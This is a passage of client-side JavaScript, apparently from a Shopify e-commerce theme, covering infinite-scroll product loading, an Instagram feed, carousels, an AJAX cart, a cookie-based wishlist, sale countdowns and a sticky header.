              if($(".infinitpagin", data.responseText).html()){
                  $('.infinitpagin').html($(".infinitpagin", data.responseText).html());
                  refreshPageMoreLoad();
                  var $productList = $('.productList');
                  var needLoadNumber  = $productList.attr("needLoadNumber");
                  needLoadNumber = needLoadNumber || 0;
                  var newNeedLoadNumber = needLoadNumber - resNumber;
                  if(newNeedLoadNumber > 0){
                    $productList.attr("needLoadNumber",newNeedLoadNumber);
                    /** load date number less than need prepare load number ,load next page **/
                    loadMore($('.infinitpagin a').attr('href'));
                  }else{
                    $productList.removeAttr("needLoadNumber");
                    /** start to preload cache data **/
                    var pagesize = $('.infinitpagin a').attr('pagesize');
                    var needCacheNumber = pagesize?pagesize*1:16*1;
                    $('.productList').attr("needCacheNumber",needCacheNumber);
                    loadMore($('.infinitpagin a').attr('href'),true);
                  }
              } else {
                  $('.infinitpagin').remove();
              }
              if(theme.mlcurrency){ currenciesChange("sapn.money"); }
              productGridView(sectionId);
              if($(".spr-badge").length > 0) {
                  $.getScript(window.location.protocol + "//productreviews.shopifycdn.com/assets/v4/spr.js");
              }
              setTimeout(function(){ productGridView(sectionId); },1000);
              if ($('.infinitpagin a.loadMore').length){
                  loadMoreBtn();
              } else {
                infiniteScroll();
              }
              $('body').removeClass('loading hideOverly');
            }else{
              var resInfinitpagin = $(".infinitpagin", data.responseText);
              if(resInfinitpagin.length>0){
                resDom.children().addClass("cache-hide");
                $('.productList .grid-products').append(resDom.html());
                var $productList = $('.productList');
                var needCacheNumber  = $productList.attr("needCacheNumber");
                if(needCacheNumber){
                  var newNeedCacheLoadNumber = needCacheNumber - resNumber;
                  /**console.log("resInfinitpagin=",resInfinitpagin);**/
                  var nextCacheUrl = resInfinitpagin.find("a").attr('href');
                  $('.infinitpagin a').attr("nextCacheUrl",nextCacheUrl);
                  if(newNeedCacheLoadNumber > 0){
                    $productList.attr("needCacheNumber",newNeedCacheLoadNumber);
                    loadMore(nextCacheUrl,true);
                  }
                }
              }else{
              	$('.productList .grid-products').append(resDom.html());
                $('.infinitpagin').remove();
              }
            }
          }
        });
      }
    }
    
    $(document).ready(function(){
      loadMoreBtn();
      $("#collection-slideshow, #sideProdSlider").slick();
    });
  }
  return collectionView;
})();

// Product grid same height
function productGridView(sectionId) {
  /*var gridRows = [],
  	  tempRow = [];

  productGridElements = $('#'+sectionId+' .grid-products .grid__item');
  productGridElements.each(function (index) {
    if ($(this).css('clear') != 'none' && index != 0) {
      gridRows.push(tempRow);
      tempRow = []; 
    }
    tempRow.push(this);

    if (productGridElements.length == index + 1) {
      gridRows.push(tempRow);
    }
  });

  $.each(gridRows, function () {
    var tallestBox = 0,
    	tallestHeight = 0,
        tallestswatch = 0;
    $.each(this, function () {
      $(this).find('.details').css('height', '');
      $(this).find('.gridSwatches').css('height', '');
      bxHeight = parseInt($(this).find('.details').outerHeight());
      elHeight = parseInt($(this).find('.grid-view_image').outerHeight());
      swHeight = parseInt($(this).find('.gridSwatches').outerHeight());
      if (elHeight > tallestHeight) { tallestHeight = elHeight; }
      if (bxHeight > tallestBox) { tallestBox = bxHeight; }
      if (swHeight > tallestswatch) { tallestswatch = swHeight; }
    });
    $.each(this, function() {
      $(this).find('.style3 .gridSwatches').css('height', tallestswatch);
      $(this).find('.details').css('height', tallestBox);
    });
  });*/
}

theme.instagram = {};
theme.instagramSection = (function() {
  function instagramSection(container) {
    var $container = this.$container = $(container),
    	sectionId = $container.attr('data-section-id'),
        act = $container.attr('data-act'),
        limit = $container.attr('data-count'),
        rds = $container.attr('data-ds'),
        rtb = $container.attr('data-tb'),
        rmb = $container.attr('data-mb');
    
    var ajaxUrl = 'https://graph.instagram.com/me/media?fields=comments_count,like_count,id,media_type,media_url,permalink,thumbnail_url,caption,children&access_token='+act;
    
    $.ajax({
		url: ajaxUrl,
        type: 'GET',
        dataType: "json",
        success: function (res) {
        	var data = res.data,
				igdiv = '#instafeed'+sectionId,
               	html = '',
                bl = bl || true;

			$.each(data, function (index, el) {
                     if (index >= limit) return 0;
                     //console.log(el);
                     var img_url = el.thumbnail_url || el.media_url;
                     html += '<div class="insta-img '+rds+' '+rtb+' '+rmb+'"><a rel="nofollow" class="instagram-" href="'+el.permalink+'" target="_blank"><img data-src="' + img_url + '" alt="" class="lazyload" /></a></div>';
            });
            $(igdiv).html(html);
            $("#instafeed"+sectionId+".carousel").slick();
		}
	});
  }
  return instagramSection;
})();

theme.carousel = (function(){
    function carousel(container) {
    	var $container = this.$container = $(container),
          sectionId = $container.attr('data-section-id'),
          carousel = $($container).find('.carousel'),
    	  tabs = this.tabs = '#' + sectionId + ' .tablink',
    	  tabcontent = this.tabcontent = '#' + sectionId + ' .tab-content';
    
    $(tabs).on('click', function(e){
        e.preventDefault();
        $(this).parent().addClass("active");
        $(this).parent().siblings().removeClass("active");
        var tab = $(this).attr("href");
        $(tabcontent).not(tab).css("display", "none");
        $(tab).fadeIn();
      	$(carousel).slick('refresh');
      	productGridView(sectionId+' '+tab);
    });
    $('#' + sectionId).each(function(){
		$(this).find('.collection-tabs li:first-child').addClass("active");
      	$(this).find('.tab-container .acor-ttl:first-child').addClass("active");
		$(this).find('.tab-container h3:first-child + .tab-content').show();
		var firsttab = $(this).find('.collection-tabs li:first-child a').attr("href");
    });
    /** 为 避免推荐的全是售罄商品，商品数量限制limit乘以3 **/  
    if($('#'+sectionId+'.recommended').length){
		var	baseUrl = $container.data('baseUrl'),
          productId = $container.data('productId'),
          limit = $container.data('limit')*3,
          productRecommendationsUrlAndContainerClass = baseUrl + '?section_id='+sectionId+'&limit=' + limit + '&product_id=' +productId + ' .product-recommendations';
      	$container.parent().load(productRecommendationsUrlAndContainerClass);
      	$("#productSlider-"+sectionId).slick();
      	setTimeout(function(){ $("#productSlider-"+sectionId).slick(); },1500);
    }

    $(carousel).slick();
    productGridView(sectionId);
    setTimeout(function(){ productGridView(sectionId); },1500);
	$(window).on('delayed-resize', function (e, resizeEvent) {
  		productGridView(sectionId);
    });
  }
  return carousel;
})();

theme.masonary = (function(){
    function masonary(container){
    	var $container = this.$container = $(container),
          sectionId = $container.attr('data-section-id'),
          masonary = this.masonary = $($container).find('.grid-masonary');
    
      loadMasonary(masonary);
      setTimeout( function(){ loadMasonary(masonary); },1000);
      function loadMasonary(masonary) {
        $(masonary).masonry({
            columnWidth: '.grid-sizer-'+sectionId,
            itemSelector: '.ms-item',
            percentPosition: true
        });
      }
  }
  return masonary;
})();

theme.ajaxCart = function(){
  	drawerTimeout: null,
  	quickshop(),gridAddToCart(),prodAddToCart(),wishlist(),updateWishlist(),freeship();queryProductByCart()

	$(".continue-shopping, .modalOverly, .closeDrawer").click(function(){
        $(".modal").fadeOut(200);
    	$("body").removeClass("loading showOverly");
    });
  	function quickshop() {
      $(document).on('click touch', '.quickShop', function(e){
       	  
          e.preventDefault(); e.stopImmediatePropagation();
          var url = $(this).attr('href'),
              imgwrapper = $(this).parents('.grid-view-item').find(".grid-view_image"),
              wrapper = $(this).parents(".grid-view-item").find('.shopWrapper');
        console.log('touch issue',url);
          $.ajax({
            url: url,
            dataType: 'html',
            type: 'GET',
            beforeSend:function(){
              $(imgwrapper).append("<i class='ad ad-spinner4 ad-spin'></i>");
              $(imgwrapper).addClass('showLoading');
            },
            success: function(data) {
              $(".shopWrapper").removeClass('active').html("");
              $(wrapper).addClass('active').html(data);
            },
            complete: function(data){
              $(imgwrapper).removeClass('showLoading');
              $(imgwrapper).find('.ad-spinner4').remove();
              if (theme.mlcurrency){ currenciesChange(".shopWrapper.active .product-single__price span.money"); }
            }
          });
      });
      $(document).on('click touch', '.closeShop', function(e){
      	e.preventDefault();
        $(this).parents(".shopWrapper").removeClass("active");
	  });
    }
  	function gridAddToCart() {
      $(document).on('click touch', '.add-to-cart', function(i){
        i.preventDefault(); i.stopImmediatePropagation();
          if (theme.ajax_cart) {
            var att = $(this).attr("id"),
            	qty = $(this).attr("rel");
            addinToCart(att, qty);
          } else {
            $(this).next().submit();
          }
        return;
      });
    }
    function prodAddToCart(){
      if (theme.ajax_cart) {
        var touchmoved;
        $(document).on('click touchend', '.product-form__cart-submit', function(i){
          if (i.preventDefault(), "disabled" != $(this).attr("disabled"))
              if (touchmoved != true) {
                var att = $(this).closest("form").find("select[name=id]").val();
                    att || (att = $(this).closest("form").find("input[name=id]").val());
                var qty = $(this).closest("form").find("input[name=quantity]").val();
                    qty || (qty = 1);
                var props = {};
                $('[name="selling_plan"]').each(function(){
                    var key = $(this).attr('name'),
                        value = $(this).val();
                    props[key] = value;
                });
                $('[name*="properties"]').each(function() {
                  var key = $(this).attr('name').split('[')[1].split(']')[0];
                  var value = $(this).val();
                  props[key] = value;
                });
                addinToCart(att, qty, props);
              }
              return;
        }).on('touchmove', function(e){
            touchmoved = true;
        }).on('touchstart', function(){
            touchmoved = false;
        });
      }
    }
    function addinToCart(att, qty, props){
      $("body").addClass("loading");
      CartJS.addItem(att, qty,props,{
          "success": function(data, textStatus, jqXHR){
             setTimeout(function() {
             	$("body").removeClass("loading showOverly");
             	$(".block-cart").addClass("active");
             },1000);
             drawerTimeout = setTimeout(function() {
                $(".block-cart").removeClass("active");
             }, 7000);
          },
          "error": function(jqXHR, textStatus, errorThrown){
            var errormsg = JSON.parse(jqXHR.responseText).description;
            $("body").removeClass("loading");
            $(".error-message").text(errormsg);
            $("body").addClass("showOverly");
              $("#errorDrawer").fadeIn(500);
              drawerTimeout = setTimeout(function(){
                  $("body").removeClass("loading showOverly"), $("#errorDrawer").fadeOut(200)
              }, 6000);
          }
      });
    }
  	/** 购物车查询当前商品信息 */
  	function queryProductByCart() {
    	$(document).on('click touch', '.queryProductByCart', function(e){
          e.preventDefault(); e.stopImmediatePropagation();
          var url = $(this).attr('href'),
              imgwrapper = $(this).parents('.grid-view-item').find(".grid-view_image"),
              wrapper = $(this).parents(".grid-view-item").find('.shopWrapper');
          window.currentCartItemId = $(this).attr('data-cart-id');
          $.ajax({
            url: url,
            dataType: 'html',
            type: 'GET',
            beforeSend:function(){
              $('body').addClass("loading");
              /** $(imgwrapper).append("<i class='ad ad-spinner4 ad-spin'></i>");
              $(imgwrapper).addClass('showLoading'); */
            },
            success: function(data) {
              /** $(".shopWrapper").removeClass('active').html("");
              $(wrapper).addClass('active').html(data); */
               $.magnificPopup.open({
                  items: {
                    src: '<div class="quick-view-popup mfpbox mfp-with-anim" id="content_quickview">' + data + '</div>',
                    type: 'inline'
                  },
                  removalDelay:500,
                  callbacks: {
                    beforeOpen: function(){
                     $('.stickyHeader').addClass('popup');
                      this.st.mainClass = 'mfp-zoom-in';
                    },
                    open: function() {              
                        $.getScript(window.location.protocol + "//productreviews.shopifycdn.com/assets/v4/spr.js");
                    },
                    close: function() {
                       $('.stickyHeader').removeClass('popup');
                      $( '#content_quickview' ).empty();
                    }
                  },
                });
            },
            complete: function(data){
              $('body').removeClass("loading");
              /** $(imgwrapper).removeClass('showLoading');
              $(imgwrapper).find('.ad-spinner4').remove(); */
              if (theme.mlcurrency){ currenciesChange(".shopWrapper.active .product-single__price span.money"); }
            }
          });
      });
      $(document).on('click touch', '.closeShop', function(e){
      	e.preventDefault();
        $(this).parents(".shopWrapper").removeClass("active");
	  });
    }
  	$(document).on('cart.requestComplete', function(event, cart) {
      	if(theme.mlcurrency){ currenciesChange("#cart-drawer sapn.money"); }
        setTimeout(function(){ freeship(); }, 3000);
    });
    function freeship() {
         var freeshipPrice = $(".freeShipMsg").attr('data-price'),
             cartTotal = CartJS.cart.total_price,
             remainfreeship = freeshipPrice-cartTotal;
         if(remainfreeship>0){
         	$(".freeShipMsg .freeShip").html(theme.Currency.formatMoney(remainfreeship, theme.moneyFormat));
            $(".freeShipMsg").removeClass('hide'); $('.freeShipclaim').addClass('hide');
            if(theme.mlcurrency){currenciesChange(".freeShipMsg .freeShip sapn.money");}
         } else {
			$(".freeShipMsg").addClass('hide'); $('.freeShipclaim').removeClass('hide');
         }
    }
  	function wishlist() {
       var cookieName = "wishlistList";
       $(document).on('click', '.addto-wishlist', function(e){
           e.preventDefault();
             var id = $(this).attr('rel');
             if($.cookie(cookieName) == null) {
               var str = '__'+id;
             } else {
               if($.cookie(cookieName).indexOf(id) == -1) {
                 var str = $.cookie(cookieName) + '__' + id;
                 	str = str.replace('____', '__');
               }
             }
             $.cookie(cookieName, str, {expires:30, path:'/'});
             $(this).find(".ad").removeClass('ad-heart-l').addClass('ad-circle-notch-r ad-spin');
             setTimeout(function(){
               $('.wishlist[rel="'+id+'"]').removeClass('addto-wishlist').find('span').text(theme.wlAvailable);
               $('.wishlist[rel="'+id+'"] .ad').removeClass('ad-circle-notch-r ad-spin').addClass('ad-heart');
               updateWishlist();
             }, 2000);
         });
      	
     }
     function updateWishlist() {
       var cookieName = "wishlistList";
       try {
         if($.cookie(cookieName) != null && $.cookie(cookieName) != '__' && $.cookie(cookieName) != '') {
           var str = String($.cookie(cookieName)).split("__");
           for (var i=0; i<str.length; i++) {
             if (str[i] != '') {
               $('.wishlist[rel="'+str[i]+'"]').removeClass('addto-wishlist').find('span').text(theme.wlAvailable);
               $('.wishlist[rel="'+str[i]+'"] .ad').removeClass('ad-heart-l').addClass('ad-heart');
               $('.favCount').text(i).removeClass('hide');
             }
           }
         }
       }
       catch (err) {}
     }
};
window.addEventListener('DOMContentLoaded',function(){$(theme.ajaxCart);});

$(document).ready(function() {
  var sections = new theme.Sections();
  sections.register('header-section', theme.HeaderSection);
  sections.register('product', theme.Product);
  sections.register('collection-template', theme.collectionView);
  sections.register('product-template', theme.Product);
  sections.register('map', theme.Maps);
  sections.register('slideshow-section', theme.SlideshowSection);
  sections.register('carousel', theme.carousel);
  sections.register('quotes', theme.Quotes);
  sections.register('masonary', theme.masonary);
  sections.register('instagram', theme.instagramSection);
});

var resizeTimer;
  $(window).resize(function () {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(function () {
      $(window).trigger('delayed-resize');
    }, 250);
});

theme.init = function() {
  theme.customerTemplates.init();
  slate.rte.wrapTable();
  slate.rte.iframeReset();

  // Common a11y fixes
  slate.a11y.pageLinkFocus($(window.location.hash));

  $('.in-page-link').on('click', function(evt){
    slate.a11y.pageLinkFocus($(evt.currentTarget.hash));
  });

  $('a[href="#"]').on('click', function(evt){
    evt.preventDefault();
  });
};
$(theme.init);

$(document).ready(function() {
  "use strict";
  
	$(document).on('click', '.currencyOpt', function(i){
      $('#CurrencySelector').val($(this).data('value'));
      $('#localization_form').submit();
    });
  
  	$(".saleTime, .heroSaleTime, .prcountdown").each(function(){
      var $this = $(this),
      	  date = $(this).data('date'),
      	  countDownDate = new Date(date).getTime();

		var x = setInterval(function(){
          var now = new Date().getTime(),	            
              distance = countDownDate - now,
              days = Math.floor(distance / (1000 * 60 * 60 * 24)),
              hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
              minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)),
              seconds = Math.floor((distance % (1000 * 60)) / 1000);

          if(days > 99){
            days = ("00" + days).substr(-3);
          } else {
            days = ("00" + days).substr(-2);
          }
          hours = ("00" + hours).substr(-2);
          minutes = ("00" + minutes).substr(-2);
          seconds = ("00" + seconds).substr(-2);

          $($this).html("<span class='days'>" + days + "<span>"+theme.days+"</span></span> <span class='hours'>" + hours + "<span>"+theme.hours+"</span></span> <span class='minutes'>"+ minutes + "<span>"+theme.minuts+"</span></span> <span class='seconds'>" + seconds + "<span>"+theme.seconds+"</span>");

          if (distance < 0){
          	clearInterval(x); $($this).hide();
            $("#countdownLbl").hide();
		  }
		}, 1000);
  	});

   // LOOKBOOK SHOP 
	$('.btn-shop').click(function(){
       $('.products .list-columns, .grid-lookbook').removeClass('active');
       $(this).next().addClass('active');
       $(this).parents('.grid-lookbook').addClass('active');
	});
	$('.btn-shop-close').click(function(){     
    	$(this).parent().removeClass('active');
	});

  	// PROMOTION HEADER show-hide
	if($.cookie('promotion') == 'true') {
    	$(".notification-bar").slideUp();
  	}
	$(".close-announcement").click(function(){
		$(".notification-bar").slideUp();
		$.cookie('promotion', 'true', { expires: 1, path:'/'});
	});
  
	// SHOW HIDE PRODUCT Filters
  	$(document).on('click touch', '.btn-filter, .closeFilter', function(){
    	$(".filterbar").toggleClass("active");
	});
	$("body").click(function(event ){
    	var $target = $(event.target);
    	if(!$target.parents().is(".sb_filter") && !$target.is(".sb_filter")&& !$target.is(".btn-filter")){
      		$(".sb_filter").removeClass("active");
    	}
	});
  
  // STICKY HEADER
  window.onscroll = function(){ scrollFunction() };
  var oldValue = 0
  var newValue = 0
  function scrollFunction() {
    newValue = window.pageYOffset;
    if(newValue!==0){
      if (oldValue < newValue) {
        /**console.log("down");**/
        $('#header').removeClass("stickyHeader fadeInDown");
        $('.stickySpace').css("min-height",'');
        $('.notification-bar').removeClass("stickyHeader fadeInDown");
      } else if (oldValue > newValue) {
        /**console.log("up");**/
        $('#header').addClass("stickyHeader fadeInDown");
        $('.stickySpace').css("min-height",$('#header').height());
        $('.notification-bar').addClass("stickyHeader fadeInDown");
      }
    }else{
        $('#header').removeClass("stickyHeader fadeInDown");
        $('.stickySpace').css("min-height",'');
        $('.notification-bar').removeClass("stickyHeader fadeInDown");
    }
    oldValue = newValue;
	/**if (theme.fixedHeader){
		if($(window).scrollTop()>145) {     
            $('#header').addClass("stickyHeader animated fadeInDown");
          	$('.stickySpace').css("min-height",$('#header').height());
    	} else {
            $('#header').removeClass("stickyHeader fadeInDown");
          	$('.stickySpace').css("min-height",'');
        }
    }**/
    
    /// sticky cart 
    // only mobile show
    var md = new MobileDetect(window.navigator.userAgent);
    if(md.mobile()){
      if($(window).scrollTop()>600 && $(".stickyCart").length){
          $("body.template-product").css('padding-bottom','70px');
          $(".stickyCart").slideDown();
      } else {
          $("body.template-product").css('padding-bottom','0');
          $(".stickyCart").slideUp();
    }
    }

    // SITE SCROLLER
    if($(window).scrollTop()>200){
      $("#site-scroll").fadeIn();
    } else {
      $("#site-scroll").fadeOut();
    }
  }
  
  $("#site-scroll").click(function() {
    $("html, body").animate({ scrollTop: 0 }, 1000);
    return false;
  }); 
  
   //Footer links for mobiles
  $(".footer-links .h4").click(function() {
    if($(window).width() < 750){
      $(this).toggleClass("active");
      $(this).next().slideToggle();
  	}
  });
  
  $(".qtyBtn").on("click", function() {
      var qtyField = $(this).parent(".qtyField"),
         oldValue = $(qtyField).find(".qty").val(),
          newVal = 1;

      if ($(this).is(".plus")) {
        newVal = parseInt(oldValue) + 1;
      } else if (oldValue > 1) {
        newVal = parseInt(oldValue) - 1;
      }
      $(qtyField).find(".qty").val(newVal);
  });

  $(document).on('click', '.gridSwatches li:not(.noImg)', function(e){
      var $this = $(this),
          newImage = $(this).attr('rel'),
          gridWrapper = $(this).parents('.grid-view-item').find('.grid-view-item__link');
      $(gridWrapper).addClass("showLoading");
      $(gridWrapper).find('.variantImg').css("background-image", "url('"+newImage+"')");
      var image = document.createElement('img');
          image.src = newImage;
          image.onload = function () {
              $(gridWrapper).removeClass("showLoading").addClass("showVariantImg");
              $this.siblings().removeClass("active");
              $this.addClass("active");
          };
      return false;
    });
});
//处理全局优惠券码
function handleCodeText (container){
  let targetEl = document.querySelector(container);
  function handleResponse() {
    let res = JSON.parse(this.responseText);
    let tarDom = new DOMParser().parseFromString(res['silde-text-only-mobie'], 'text/html').querySelector('#silde-text-only-mobie-dom');
    if(tarDom){
      let fps = tarDom.dataset.code_autoplay_time * 1000;
      targetEl.innerHTML = tarDom.innerHTML;
      let swiperContainers = targetEl.querySelector('.swiper-container');
      let sildeTextOnlyMobie = new Swiper(swiperContainers, {
        autoplay: {
          delay: fps
        },
        loop : true
      })
    }
  }
  const request = new XMLHttpRequest();
  request.addEventListener('load', handleResponse);
  request.open('GET', '/?sections=silde-text-only-mobie', true);
  request.send();
}